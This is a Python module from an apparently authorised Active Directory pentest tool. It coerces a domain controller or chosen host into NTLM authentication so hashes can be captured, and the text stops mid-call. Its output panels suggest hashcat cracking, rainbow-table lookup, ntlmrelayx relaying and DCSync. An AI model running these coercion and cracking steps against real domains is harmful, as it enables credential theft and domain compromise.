"""Interactive NTLM capture probes built on reusable listener/trigger services."""

from __future__ import annotations

from dataclasses import dataclass
from datetime import datetime, timezone
import os
from pathlib import Path
import shlex
from typing import Any, Protocol

from adscan_internal import telemetry
from adscan_internal.interaction import is_non_interactive
from adscan_internal.rich_output import (
    confirm_operation,
    mark_sensitive,
    print_error,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_panel,
    print_success,
    print_warning,
)
from adscan_internal.services.ntlm_capture_workflow import (
    NativeCoercionTrigger,
    NativeListenerCapture,
    NtlmCaptureProbeResult,
    build_socks5_proxies,
    looks_like_ntlm_hash,
    run_ntlm_capture_probe,
)
from adscan_internal.services.current_vantage_reachability_service import (
    resolve_targets_from_current_vantage,
)
from adscan_internal.reporting_compat import load_optional_report_service_attr
from adscan_internal.workspaces import domain_subpath
from adscan_internal.models.domain import resolve_dc_ip
from adscan_internal.workspaces.computers import count_target_file_entries


class NtlmCaptureShell(Protocol):
    """Minimal shell surface used by the NTLM capture probe CLI."""

    myip: str | None
    interface: str | None
    domains_data: dict[str, dict[str, Any]]
    domains_dir: str
    current_workspace_dir: str | None
    type: str | None
    _last_run_command_error: tuple[str, Exception] | None

    def spawn_command(
        self,
        command: list[str],
        *,
        env: dict[str, str] | None = None,
        shell: bool = False,
        stdout: Any = None,
        stderr: Any = None,
        preexec_fn: Any = None,
    ) -> Any:
        """Spawn a command in the background."""
        ...

    def run_command(self, command: Any, *, timeout: int | None = None, **kwargs) -> Any:
        """Run a blocking command."""
        ...

    def save_workspace_data(self) -> bool:
        """Persist workspace state after updating domain metadata."""
        ...


class PreparedNtlmProbe(Protocol):
    """Execution contract for a prepared NTLM probe.

    ``pdc_ip``/``pdc_hostname`` are reused as the generic target IP/hostname:
    for the default PDC path they hold the domain PDC, and for an explicit
    target they hold the operator-supplied host. ``pdc_hostname`` may be empty
    for an explicit IP whose hostname is unknown - in that case the listener
    accepts any captured principal instead of matching a specific computer
    account. ``proxy_spec`` carries the optional SOCKS5 ``host:port`` pivot.
    """

    domain: str
    pdc_ip: str
    pdc_hostname: str
    username: str
    secret: str
    proxy_spec: str | None
    match_expected_username: bool


def _probe_coercion_target_reachable(
    targets: list[str],
    *,
    port: int = 445,
    timeout: float = 3.0,
) -> bool | None:
    """Return True if any target accepts a TCP connection on *port*, False if all fail, None if empty."""
    from adscan_internal.services.async_bridge import run_async_sync  # noqa: PLC0415
    from adscan_internal.services.network_probe_service import tcp_probe_multi  # noqa: PLC0415

    if not targets:
        return None
    for host in targets:
        if not str(host or "").strip():
            continue
        try:
            result = run_async_sync(tcp_probe_multi(host, [port], timeout=timeout))
            if result.status == "open":
                return True
        except Exception:  # noqa: BLE001
            continue
    return False


def _looks_like_ip(value: str) -> bool:
    """Return True when *value* parses as an IPv4/IPv6 address."""

    import ipaddress  # noqa: PLC0415

    try:
        ipaddress.ip_address(str(value or "").strip())
        return True
    except ValueError:
        return False


@dataclass(frozen=True)
class NtlmProbeArgs:
    """Parsed arguments for the NTLM auth-type probe verb.

    ``domain`` is the SPN/credential domain (explicit or inferred). When
    ``target_ip`` is set the probe targets that host explicitly; otherwise it
    falls through to the current domain's PDC. ``proxy_spec`` is an optional
    ``host:port`` SOCKS5 endpoint for pivot-only-reachable targets.
    """

    domain: str | None
    target_ip: str | None
    capture_timeout: int
    trigger_timeout: int
    method_filter: str | None
    proxy_spec: str | None


def _parse_probe_args(args: str) -> NtlmProbeArgs:
    """Parse ``check_ntlm_auth`` arguments.

    Positional forms accepted (flags may appear anywhere):

    - ``<domain> <ip>`` -> explicit SPN/credential domain + explicit target IP.
    - ``<ip>``          -> IP only; domain inferred from shell context later.
    - ``<domain>``      -> domain only; falls through to that domain's PDC
      (the legacy ``check_dc_ntlm_auth_type`` behaviour).

    The first positional that parses as an IP becomes ``target_ip``; the first
    positional that does not becomes ``domain``. Order between them is
    therefore irrelevant, which keeps both ``<domain> <ip>`` and a bare
    ``<ip>`` unambiguous.
    """

    domain: str | None = None
    target_ip: str | None = None
    capture_timeout = 45
    trigger_timeout = 120
    method_filter: str | None = None
    proxy_spec: str | None = None

    tokens = shlex.split(str(args or ""))
    index = 0
    while index < len(tokens):
        token = tokens[index]
        if token == "--timeout" and index + 1 < len(tokens):
            capture_timeout = int(tokens[index + 1])
            index += 2
            continue
        if token.startswith("--timeout="):
            capture_timeout = int(token.split("=", 1)[1])
            index += 1
            continue
        if token == "--trigger-timeout" and index + 1 < len(tokens):
            trigger_timeout = int(tokens[index + 1])
            index += 2
            continue
        if token.startswith("--trigger-timeout="):
            trigger_timeout = int(token.split("=", 1)[1])
            index += 1
            continue
        if token == "--method" and index + 1 < len(tokens):
            method_filter = tokens[index + 1]
            index += 2
            continue
        if token.startswith("--method="):
            method_filter = token.split("=", 1)[1]
            index += 1
            continue
        if token == "--socks5" and index + 1 < len(tokens):
            proxy_spec = tokens[index + 1]
            index += 2
            continue
        if token.startswith("--socks5="):
            proxy_spec = token.split("=", 1)[1]
            index += 1
            continue
        if _looks_like_ip(token):
            if target_ip is None:
                target_ip = token
        elif domain is None:
            domain = token
        index += 1

    return NtlmProbeArgs(
        domain=domain,
        target_ip=target_ip,
        capture_timeout=capture_timeout,
        trigger_timeout=trigger_timeout,
        method_filter=method_filter,
        proxy_spec=proxy_spec,
    )



def _summarize_output(text: str, *, max_lines: int = 12) -> str:
    """Return a compact single-string summary of command output for debug logs."""

    lines = [line.rstrip() for line in str(text or "").splitlines() if line.strip()]
    if not lines:
        return ""
    if len(lines) <= max_lines:
        return "\n".join(lines)
    head_count = max_lines // 2
    tail_count = max_lines - head_count
    summary_lines = lines[:head_count] + ["..."] + lines[-tail_count:]
    return "\n".join(summary_lines)


def _kernel_source_ip_toward(dc_ip: str) -> str | None:
    """Return the kernel-chosen source IP toward *dc_ip* (UDP-connect trick).

    No packets are sent - ``connect()`` on a UDP socket only resolves the route
    and binds the local address. Returns ``None`` on any failure.
    """

    import socket  # noqa: PLC0415

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect((dc_ip, 9))
            return str(sock.getsockname()[0])
    except Exception:  # noqa: BLE001 - heuristic only, never fatal
        return None


def _dc_listener_reachability_warning(
    *,
    listener_ip: str,
    dc_ip: str,
    interface: str | None,
) -> str | None:
    """Return an advisory string when the DC is unlikely to reach the listener.

    Coercion is the one path where the DC initiates the connection back to us,
    so a working us->DC route says nothing about the DC->us return path. This
    flags the high-risk topologies (VPN/pivot interface, the bind IP differing
    from the kernel's source IP toward the DC, RFC1918/public mismatch) so a
    no-capture result is read as INCONCLUSIVE rather than a flat negative.
    Advisory only - never blocks the probe.
    """

    import ipaddress  # noqa: PLC0415

    reasons: list[str] = []

    iface = str(interface or "").strip().lower()
    if iface and any(iface.startswith(prefix) for prefix in ("tun", "tap", "ppp")):
        reasons.append(
            f"the listener is bound to a VPN/pivot interface ({iface}); the PDC almost "
            "certainly has no route back to it"
        )

    kernel_source = _kernel_source_ip_toward(dc_ip)
    if kernel_source and listener_ip and kernel_source != listener_ip:
        reasons.append(
            "the listener bind IP differs from the kernel's source IP toward the DC, so the "
            "advertised address is not the one the DC would route back to"
        )

    try:
        listener_addr = ipaddress.ip_address(listener_ip)
        dc_addr = ipaddress.ip_address(dc_ip)
    except ValueError:
        listener_addr = dc_addr = None

    if listener_addr is not None and dc_addr is not None:
        if listener_addr.is_private != dc_addr.is_private:
            reasons.append(
                "the listener IP and DC IP straddle the private/public boundary, so the DC is "
                "unlikely to have a return route to the listener"
            )
        elif listener_addr.is_private and dc_addr.is_private:
            net_listener = ipaddress.ip_network(f"{listener_ip}/24", strict=False)
            if dc_addr not in net_listener:
                reasons.append(
                    "the listener IP and DC IP are in different /24 subnets; verify routing "
                    "before treating a no-capture result as conclusive"
                )

    if not reasons:
        return None
    return (
        "DC->listener return path may be unreachable: "
        + "; ".join(reasons)
        + ". A no-capture result under this condition is INCONCLUSIVE, not evidence that NTLM "
        "is unavailable - pass an explicit reachable listener IP or establish a pivot."
    )


def _ntlm_disabled_by_posture(shell: NtlmCaptureShell, domain: str) -> bool:
    """Return True when the posture system knows NTLM is disabled for *domain*.

    Consumes the centralized posture constraint only - it does NOT run its own
    NTLM-disabled detection (per the AD-constraints single-source-of-truth
    rule). A no-capture outcome under a known-disabled NTLM posture is a
    hardening positive, not a failed probe.
    """

    from adscan_internal.services.domain_posture import (  # noqa: PLC0415
        ConstraintCategory,
        SignalConfidence,
        TriState,
        get_constraint,
    )

    try:
        constraint = get_constraint(
            shell.domains_data,
            domain=domain,
            category=ConstraintCategory.NTLM_AUTHENTICATION,
        )
    except Exception:  # noqa: BLE001 - posture read must never break the probe
        return False
    return (
        constraint.effective_state == TriState.DISABLED
        and constraint.confidence == SignalConfidence.HIGH
    )


def _prepare_ntlm_probe(
    shell: NtlmCaptureShell,
    domain: str,
    *,
    target_override: str | None = None,
    proxy_spec: str | None = None,
) -> PreparedNtlmProbe | None:
    """Validate domain/tool prerequisites and return normalized probe inputs.

    When ``target_override`` is an explicit IP the probe targets that host
    instead of the domain PDC; the credential/SPN domain is still taken from
    ``domain``. When it is ``None`` the function falls through to the existing
    PDC resolution. ``proxy_spec`` is threaded onto the prepared object so the
    coercion trigger can pivot through a SOCKS5 proxy.
    """

    domain_data = shell.domains_data.get(domain)
    if not isinstance(domain_data, dict):
        print_error(
            f"Domain not found in current context: {mark_sensitive(domain, 'domain')}"
        )
        return None

    if not shell.myip:
        print_error(
            "This probe requires a listener IP. Ensure 'myip' is available."
        )
        return None

    pdc_ip = str(domain_data.get("pdc") or "").strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip()
    username = str(domain_data.get("username") or "").strip()
    secret = str(domain_data.get("password") or "").strip()

    explicit_target = str(target_override or "").strip()
    match_expected_username = True
    if explicit_target:
        # Explicit-target branch: the operator-supplied IP is the target. We do
        # NOT synthesize a hostname from the IP (Kerberos SPN rule). We only
        # reuse the known PDC hostname/FQDN when the explicit IP IS the PDC;
        # otherwise the hostname is left empty and the listener accepts any
        # captured principal rather than matching a specific computer account.
        target_ip = explicit_target
        if pdc_ip and explicit_target == pdc_ip:
            target_hostname = pdc_hostname
        else:
            dc_fqdn = str(domain_data.get("dc_fqdn") or "").strip()
            target_hostname = ""
            match_expected_username = False
            if dc_fqdn:
                # FQDN is informational only here; we never bind a Kerberos SPN
                # to an IP. The SMB trigger path uses NTLM, so this stays unused
                # unless a future Kerberos trigger is wired in.
                print_info_debug(
                    "[ntlm-capture] explicit target differs from known PDC; "
                    f"known DC FQDN={mark_sensitive(dc_fqdn, 'hostname')} not bound to the "
                    f"explicit IP {mark_sensitive(explicit_target, 'ip')}."
                )
        pdc_ip = target_ip
        pdc_hostname = target_hostname

    if not pdc_ip:
        print_error(
            "Target IP missing. Provide an explicit <ip>, or ensure Phase 1 / DNS "
            "discovery populated 'pdc' for this domain."
        )
        return None
    if not explicit_target and not pdc_hostname:
        print_error(
            "PDC IP/hostname missing for this domain. Ensure Phase 1 or DNS discovery populated "
            "'pdc' and 'pdc_hostname'."
        )
        return None

    if not username or not secret:
        print_error(
            "This probe requires authenticated domain credentials in the current domain context."
        )
        return None

    workspace_dir = str(shell.current_workspace_dir or "").strip() or os.getcwd()
    reachability_targets = [pdc_ip]
    if pdc_hostname:
        reachability_targets.append(pdc_hostname)
        reachability_targets.append(f"{pdc_hostname}.{domain}")
    reachability = resolve_targets_from_current_vantage(
        workspace_dir,
        shell.domains_dir,
        domain,
        targets=reachability_targets,
    )
    if reachability.report_available:
        assessment = next(
            (
                item
                for item in reachability.assessments
                if item.requested_target in set(reachability_targets)
                and item.matched
            ),
            None,
        )
        if assessment and not assessment.reachable:
            marked_target = mark_sensitive(pdc_ip, "ip")
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                f"Skipping coercion precheck in {marked_domain}: current-vantage reachability does not show the target {marked_target} as reachable."
            )
            if reachability.vantage_mode:
                print_info_debug(
                    "[ntlm-capture] reachability precheck blocked probe: "
                    f"target={marked_target} "
                    f"vantage_mode={mark_sensitive(reachability.vantage_mode, 'text')} "
                    f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
                )
            else:
                print_info_debug(
                    "[ntlm-capture] reachability precheck blocked probe: "
                    f"target={marked_target} "
                    f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
                )
            print_instruction(
                "Refresh the network reachability inventory from the current vantage or establish a pivot before retrying this coercion."
            )
            return None
        if assessment and assessment.reachable:
            print_info_debug(
                "[ntlm-capture] current-vantage reachability confirms target access: "
                f"target={mark_sensitive(pdc_ip, 'ip')} "
                f"matched_ips={mark_sensitive(','.join(assessment.matched_ips), 'text')} "
                f"report={mark_sensitive(str(reachability.report_path or ''), 'path')}"
            )
        else:
            print_info_debug(
                "[ntlm-capture] current-vantage reachability report did not contain an exact match for "
                f"{mark_sensitive(pdc_ip, 'ip')}; proceeding without a hard block."
            )
    else:
        # No persisted report, do a live TCP probe on the PDC so we don't
        # send coercion traffic to a host that is not reachable from here.
        probe_targets = [pdc_ip]
        if pdc_hostname:
            probe_targets.append(f"{pdc_hostname}.{domain}")
            probe_targets.append(pdc_hostname)
        probe_targets = [t for t in probe_targets if t]
        live_reachable = _probe_coercion_target_reachable(probe_targets)
        marked_target = mark_sensitive(pdc_ip, "ip")
        if live_reachable is False:
            marked_domain = mark_sensitive(domain, "domain")
            print_warning(
                f"Skipping coercion precheck in {marked_domain}: live TCP probe confirms the target {marked_target} is not reachable from the current vantage."
            )
            print_info_debug(
                "[ntlm-capture] live probe blocked coercion: "
                f"target={marked_target} targets={probe_targets}"
            )
            return None
        print_info_debug(
            "[ntlm-capture] no reachability report; "
            + (
                f"live TCP probe confirmed {marked_target} is reachable."
                if live_reachable
                else f"live TCP probe returned no result for {marked_target}; proceeding."
            )
        )

    advisory = _dc_listener_reachability_warning(
        listener_ip=str(shell.myip or "").strip(),
        dc_ip=pdc_ip,
        interface=getattr(shell, "interface", None),
    )
    if advisory:
        # Pre-flight reachability is only a HEURISTIC and gave false alarms before a
        # capture that then succeeded (e.g. a single-homed member NAT'd back to the
        # listener via its gateway). Keep it in --debug only; the no-capture path
        # (_render_inbound_connection_diagnostic) already surfaces the reachability
        # caveat to the operator with real evidence (0 inbound connections), so the
        # operator is never left guessing on an actual failure.
        print_info_debug(f"[ntlm-capture] reachability heuristic (advisory): {advisory}")
        print_info_debug(
            "[ntlm-capture] DC->listener reachability heuristic flagged the return path: "
            f"listener={mark_sensitive(str(shell.myip or ''), 'ip')} "
            f"dc={mark_sensitive(pdc_ip, 'ip')} "
            f"interface={mark_sensitive(str(getattr(shell, 'interface', '') or ''), 'text')}"
        )

    class _Prepared:
        pass

    prepared = _Prepared()
    prepared.domain = domain
    prepared.pdc_ip = pdc_ip
    prepared.pdc_hostname = pdc_hostname
    prepared.username = username
    prepared.secret = secret
    prepared.proxy_spec = str(proxy_spec or "").strip() or None
    prepared.match_expected_username = match_expected_username
    return prepared


def _render_captured_hash_jackpot(
    result: NtlmCaptureProbeResult, *, domain: str, target_is_pdc: bool = True
) -> None:
    """Render the verdict-first capture panel when an NTLM authentication is observed.

    ``target_is_pdc`` controls the source label: a coerced PDC is called out as
    such, while an arbitrary explicit host is described by the ACTUAL captured
    computer account rather than mislabelled as the PDC. The principal is always
    rendered from the real captured identity (never an empty ``@domain``).
    """

    observation = result.observation
    auth_type = result.auth_type or "NTLM"
    if observation is None:
        return

    raw_user = str(observation.raw_user or "").strip()
    captured_sam = ""
    captured_domain = ""
    if "\\" in raw_user:
        captured_domain, captured_sam = raw_user.split("\\", 1)
    elif "@" in raw_user:
        captured_sam, captured_domain = raw_user.split("@", 1)
    else:
        captured_sam = raw_user

    # Fall back to the listener's clean username if the raw principal lacked a
    # parseable sAMAccountName, and to the SPN/credential domain only as a last
    # resort so the panel never renders an empty principal.
    captured_sam = (captured_sam or str(observation.clean_user or "").strip()).strip()
    captured_domain = (captured_domain or domain).strip()

    # Build the principal from whatever real identity we have. Prefer the full
    # DOMAIN\\account form; degrade gracefully rather than showing "@domain".
    if captured_sam and captured_domain:
        marked_principal = (
            f"{mark_sensitive(captured_sam, 'user')}@{mark_sensitive(captured_domain, 'domain')}"
        )
    elif captured_sam:
        marked_principal = str(mark_sensitive(captured_sam, "user"))
    elif raw_user:
        marked_principal = str(mark_sensitive(raw_user, "user"))
    else:
        marked_principal = "[dim]unknown principal[/dim]"

    marked_auth = mark_sensitive(auth_type, "text")

    # Only call the source the PDC when it actually is. For an arbitrary host we
    # describe the source by the captured computer account so the operator is
    # not misled into thinking a member is the domain PDC.
    is_machine_account = captured_sam.endswith("$")
    if target_is_pdc:
        source_label = "coerced PDC"
        account_role = "DC machine account"
    elif is_machine_account:
        source_label = f"coerced host ({mark_sensitive(captured_sam, 'user')})"
        account_role = "host machine account"
    else:
        source_label = "coerced host"
        account_role = "captured account"

    lines: list[str] = [
        f"[bold]Verdict[/bold]   [green][+][/green] {marked_auth} authentication captured from {source_label}",
        f"[bold]Principal[/bold] {marked_principal}",
    ]
    if auth_type == "NTLMv1":
        lines.append(
            f"[bold]Posture[/bold]   [red][!][/red] NTLMv1 from {account_role} — NT hash recovery guaranteed via rainbow tables"
        )
    elif auth_type == "NTLMv2":
        lines.append(
            "[bold]Posture[/bold]   [yellow][~][/yellow] NTLMv2 in use — offline cracking only (hashcat -m 5600)"
        )

    next_lines: list[str] = ["", "[bold]Next:[/bold]"]
    if auth_type == "NTLMv1":
        next_lines.append(
            "  [cyan]>[/cyan] Extract DES ciphertexts: [bold]ntlmv1.py --ntlmv1 <hash>[/bold]"
        )
        next_lines.append(
            "  [cyan]>[/cyan] Query Mandiant rainbow tables (8.6 TB, public): [bold]crackalack_lookup ~/ntlmv1-tables/ ~/DES[/bold]"
        )
        if target_is_pdc:
            next_lines.append(
                "  [cyan]>[/cyan] NT hash recovered → DCSync for full domain compromise (guaranteed, <12 h on consumer HW)"
            )
        else:
            next_lines.append(
                "  [cyan]>[/cyan] NT hash recovered → authenticate as the host machine account; pivot via its local/domain rights"
            )
    else:
        next_lines.append(
            "  [cyan]>[/cyan] Crack offline with [bold]hashcat -m 5600 hash.txt wordlist.txt -r rules/best64.rule[/bold]"
        )
    next_lines.append(
        "  [cyan]>[/cyan] If SMB signing is unenforced on other hosts, relay with [bold]ntlmrelayx[/bold] instead of cracking"
    )
    next_lines.append(
        "  [cyan]>[/cyan] Inspect the full captured hash in the SMB listener log inside the workspace"
    )

    print_panel(
        "\n".join(lines + next_lines),
        title="[bold]NTLM Capture[/bold] [green]captured[/green]",
        title_align="left",
        border_style="green",
    )


def _render_inbound_connection_diagnostic(result: NtlmCaptureProbeResult) -> None:
    """Render the inbound-connection tally that splits reachability from auth-type.

    This is the diagnostic that makes a "no capture" outcome self-explaining:
    zero inbound connections means the target never routed back to the listener
    (a reachability artifact - the verdict is inconclusive, not a negative);
    one or more inbound connections with no NTLM completed from the PDC is a
    real auth-type / refusal signal.
    """

    inbound = result.inbound
    if inbound.total_connections <= 0:
        print_warning(
            "[~] Listener saw 0 inbound connections during the capture window: the target "
            "never routed back to the listener IP. This no-capture result is INCONCLUSIVE "
            "(reachability), not evidence that NTLM is unavailable."
        )
        print_instruction(
            "Confirm the target has a route back to the listener IP (different subnet, NAT, or "
            "VPN/pivot can break the return path), or pass an explicit reachable listener IP."
        )
        return

    masked_sources = ", ".join(
        str(mark_sensitive(ip, "ip")) for ip in inbound.source_ips
    ) or "unknown source"
    stage_summary = ", ".join(
        f"{stage}={count}" for stage, count in inbound.handshake_stages
    ) or "connected"
    if inbound.ntlm_seen:
        print_warning(
            f"[~] Listener saw {inbound.total_connections} inbound connection(s) "
            f"from {masked_sources}; NTLM was negotiated but no Authenticate completed "
            f"from the PDC machine account (handshake stages: {stage_summary})."
        )
        print_instruction(
            "An inbound NTLM negotiation that never completed points at a non-PDC source, a "
            "Kerberos-preferring client, or auth refusal - not a reachability problem."
        )
    else:
        print_warning(
            f"[~] Listener saw {inbound.total_connections} inbound connection(s) "
            f"from {masked_sources}; none advanced to NTLM (handshake stages: {stage_summary}). "
            "The target reached the listener but did not attempt NTLM."
        )
        print_instruction(
            "The target connected but did not NTLM-auth: the DC may prefer Kerberos or refuse "
            "NTLM. Cross-check with the domain NTLM posture before concluding."
        )


def _render_failed_ntlm_capture_probe(result: NtlmCaptureProbeResult) -> None:
    """Render a precise user-facing explanation for a failed NTLM capture probe."""

    trigger_output = (
        f"{result.trigger_stdout or ''}\n{result.trigger_stderr or ''}".lower()
    )

    if result.reason == "listener_exited_during_capture":
        print_warning(
            "[!] The SMB listener stopped before the capture window completed, so the NTLM probe "
            "result is inconclusive."
        )
        _render_inbound_connection_diagnostic(result)
        return

    if result.trigger_returncode not in (None, 0):
        print_warning(
            f"[!] Native coercion returned code {result.trigger_returncode} and no capture was observed."
        )
        if "status_not_supported" in trigger_output:
            print_instruction(
                "The native coercion trigger reported STATUS_NOT_SUPPORTED. Treat this as a "
                "strong sign that NTLM/SMB auth is disabled or restricted on the target."
            )
        _render_inbound_connection_diagnostic(result)
        return

    print_warning("[-] No NTLM authentication capture was observed from the PDC.")
    _render_inbound_connection_diagnostic(result)
    print_instruction(
        "If other hosts authenticated to the listener during this window, do not attribute "
        "those captures to the PDC unless the captured username matches the PDC computer account."
    )


def _render_ntlm_disabled_finding(domain: str) -> None:
    """Render the no-capture outcome as a positive hardening finding.

    When NTLM is known-disabled by posture, the absence of an NTLM hash from
    the coerced PDC is the expected, secure result - frame it as a hardening
    finding rather than a failed probe so the operator does not misread it.
    """

    marked_domain = mark_sensitive(domain, "domain")
    print_panel(
        (
            "[bold]Verdict[/bold]   [green][+][/green] No NTLM emitted by the coerced PDC - "
            "consistent with NTLM authentication being disabled\n"
            f"[bold]Domain[/bold]    {marked_domain}\n"
            "[bold]Posture[/bold]   [green][+][/green] NTLM disabled (HIGH confidence) - the DC "
            "will not hand an NTLM hash to a coercion listener\n\n"
            "[bold]Interpretation:[/bold] this is a security positive, not a probe failure. "
            "Pivot to Kerberos-based techniques; NTLM relay/coercion-to-hash is not viable here."
        ),
        title="[bold]NTLM Capture[/bold] [green]hardening positive[/green]",
        title_align="left",
        border_style="green",
    )


def _render_ntlm_disabled_sweep_skip(shell: NtlmCaptureShell, domain: str) -> None:
    """Render the pre-emptive sweep skip when NTLM is disabled domain-wide.

    Distinct from :func:`_render_ntlm_disabled_finding` (a post-hoc no-capture
    verdict): this panel fires BEFORE any listener bind or coercion trigger,
    when the posture system already knows NTLM is disabled at HIGH confidence.
    It frames the skip as a defensive win and makes explicit that NO coercion
    was fired (OPSEC clean) so the operator reads it as good news, not failure.

    Matches the visual grammar of the sweep's own panels (lock glyph,
    left-aligned ``[bold]Label[/bold]`` rows) but uses a green border to signal
    the hardening-positive register rather than the yellow OPSEC heads-up.
    """

    marked_domain = mark_sensitive(domain, "domain")
    pdc_ip = str((shell.domains_data or {}).get(domain, {}).get("pdc") or "").strip()
    marked_target = mark_sensitive(pdc_ip, "ip") if pdc_ip else "domain controller"
    print_panel(
        (
            "[green][+][/green] [bold]NTLM authentication is disabled domain-wide[/bold] "
            "(posture: HIGH confidence) - a defensive hardening positive.\n\n"
            f"[bold]Domain[/bold]    {marked_domain}\n"
            f"[bold]Target[/bold]    {marked_target}\n"
            "[bold]Coercion[/bold]  [green]not fired[/green] - no listener bound, no "
            "auth coerced (OPSEC clean)\n\n"
            "[bold]Why skipped:[/bold] the NTLMv1-downgrade classification is not "
            "applicable here. With NTLM disabled by policy, the domain controller "
            "will not hand an NTLM hash to a coercion listener by design, so there is "
            "nothing to downgrade or classify. Firing the sweep would only loop over "
            "every method x pipe to a guaranteed [dim]NOT_SUPPORTED[/dim].\n\n"
            "[bold]Recorded as[/bold] a defensive finding. Pivot to Kerberos-based "
            "techniques; NTLM relay and coercion-to-hash are not viable in this domain."
        ),
        title="\U0001f510 [bold]NTLM Auth-Type Sweep[/bold] [green]skipped - hardening positive[/green]",
        title_align="left",
        border_style="green",
    )


def _render_no_capture_next_steps(result: NtlmCaptureProbeResult) -> None:
    """Render actionable next steps for no-capture outcomes."""

    trigger_output = (
        f"{result.trigger_stdout or ''}\n{result.trigger_stderr or ''}".lower()
    )

    if result.reason != "capture_not_observed":
        return

    if "status_not_supported" in trigger_output:
        print_instruction(
            "Next: this environment likely blocks NTLM/SMB auth for the trigger path. "
            "Pivot to LDAP-based or HTTP-based coercion if available."
        )
        return

    print_instruction(
        "Next: confirm LLMNR/NBT-NS/SMB reachability to the listener, then retry. "
        "To narrow the trigger surface, pass --method=<name> with a known-working coercion vector."
    )


def _persist_ntlm_probe_result(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    result: NtlmCaptureProbeResult | None,
    status: str,
    reason: str | None,
    reachable_ip_count: int | None = None,
    method_filter: str | None = None,
) -> None:
    """Persist NTLM auth-type probe metadata in ``domains_data`` and workspace JSON."""

    domain_state = shell.domains_data.setdefault(domain, {})
    if not isinstance(domain_state, dict):
        domain_state = {}
        shell.domains_data[domain] = domain_state

    checked_at = datetime.now(timezone.utc).replace(microsecond=0).isoformat()
    auth_type = result.auth_type if result and result.success else None
    probe_state = {
        "status": status,
        "auth_type": auth_type,
        "reason": reason,
        "checked_at": checked_at,
        "source": "coerced_pdc_capture",
        "listener_returncode": result.listener_returncode if result else None,
        "listener_expected_stop": result.listener_expected_stop if result else None,
        "trigger_returncode": result.trigger_returncode if result else None,
        "trigger_auth_mode": result.trigger_auth_mode if result else None,
        "attempted_trigger_auth_modes": list(result.attempted_trigger_auth_modes)
        if result
        else [],
        "trigger_error_kind": result.trigger_error_kind if result else None,
        "trigger_error_detail": result.trigger_error_detail if result else None,
        "reachable_ip_count": reachable_ip_count,
        "method_filter": method_filter,
        "workspace_type": str(getattr(shell, "type", "") or "").strip().lower() or None,
    }
    if result is not None:
        inbound = result.inbound
        probe_state["inbound_connection_count"] = inbound.total_connections
        probe_state["inbound_source_ip_count"] = len(inbound.source_ips)
        probe_state["inbound_ntlm_seen"] = inbound.ntlm_seen
    if result and result.observation is not None:
        probe_state["captured_user"] = result.observation.raw_user
        probe_state["capture_version"] = result.observation.ntlm_version

    domain_state["dc_ntlm_auth_type"] = auth_type
    domain_state["dc_ntlm_auth_probe"] = probe_state

    if auth_type in {"NTLMv1", "NTLMv2"}:
        record_technical_finding = load_optional_report_service_attr(
            "record_technical_finding",
            action="Technical finding sync",
            debug_printer=print_info_debug,
            prefix="[ntlm-capture]",
        )
        if callable(record_technical_finding):
            try:
                finding_details = {
                    "observed_auth_type": auth_type,
                    "probe_status": status,
                    "probe_reason": reason,
                    "checked_at": checked_at,
                    "source": "coerced_pdc_capture",
                    "captured_user": probe_state.get("captured_user"),
                    "trigger_auth_mode": probe_state.get("trigger_auth_mode"),
                    "attempted_trigger_auth_modes": ",".join(
                        probe_state.get("attempted_trigger_auth_modes") or []
                    ),
                    "trigger_error_kind": probe_state.get("trigger_error_kind"),
                    "trigger_error_detail": probe_state.get("trigger_error_detail"),
                    "trigger_returncode": probe_state.get("trigger_returncode"),
                    "listener_returncode": probe_state.get("listener_returncode"),
                    "reachable_ip_count": reachable_ip_count,
                    "method_filter": method_filter,
                    "workspace_type": probe_state.get("workspace_type"),
                }
                record_technical_finding(
                    shell,
                    domain,
                    key="ntlmv1_enabled",
                    value=(auth_type == "NTLMv1"),
                    details=finding_details,
                )
            except Exception as exc:  # pragma: no cover - best effort sync
                telemetry.capture_exception(exc)
                print_info_debug(
                    f"[ntlm-capture] Failed to persist NTLM auth-type finding: {exc}"
                )

    if hasattr(shell, "save_workspace_data"):
        try:
            shell.save_workspace_data()
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_info_debug(
                "[ntlm-capture] failed to persist workspace data after probe update: "
                f"{mark_sensitive(str(exc), 'detail')}"
            )


def _execute_ntlm_capture_probe(
    shell: NtlmCaptureShell,
    *,
    domain: str,
    capture_timeout: int,
    trigger_timeout: int,
    method_filter: str | None,
    reachable_ip_count: int | None = None,
    target_override: str | None = None,
    proxy_spec: str | None = None,
) -> NtlmCaptureProbeResult | None:
    """Run the NTLM auth-type probe and persist the resulting domain metadata.

    When ``target_override`` is set the probe targets that explicit IP instead
    of the domain PDC; ``proxy_spec`` optionally pivots the coercion trigger
    through a SOCKS5 proxy. Both default to the legacy PDC behaviour when absent.
    """

    prepared = _prepare_ntlm_probe(
        shell, domain, target_override=target_override, proxy_spec=proxy_spec
    )
    if prepared is None:
        return None

    prepared_proxy_spec = getattr(prepared, "proxy_spec", None)
    prepared_match_expected = bool(getattr(prepared, "match_expected_username", True))
    proxies = None
    if prepared_proxy_spec:
        try:
            proxies = build_socks5_proxies(prepared_proxy_spec)
        except ValueError as exc:
            print_error(f"Invalid --socks5 value: {mark_sensitive(str(exc), 'text')}")
            return None

    ntlm_disabled = _ntlm_disabled_by_posture(shell, domain)
    if ntlm_disabled:
        print_warning(
            f"[~] Domain {mark_sensitive(domain, 'domain')} is known to have NTLM authentication "
            "disabled (posture: HIGH confidence). The target will not emit an NTLM hash to a "
            "coercion listener by design - a no-capture result here is a hardening positive, "
            "not a failed probe."
        )

    marked_domain = mark_sensitive(domain, "domain")
    if prepared.pdc_hostname:
        marked_target = mark_sensitive(f"{prepared.pdc_hostname}.{domain}", "hostname")
    else:
        marked_target = mark_sensitive(prepared.pdc_ip, "ip")
    marked_listener = mark_sensitive(shell.myip, "ip")
    print_info(
        f"[*] Checking NTLM auth type for target {marked_target} in domain {marked_domain} "
        f"via coerced authentication to listener {marked_listener}"
    )
    if method_filter:
        print_info(f"    Filtering native coercion method: {method_filter}", spacing="none")
    if proxies is not None:
        print_info(
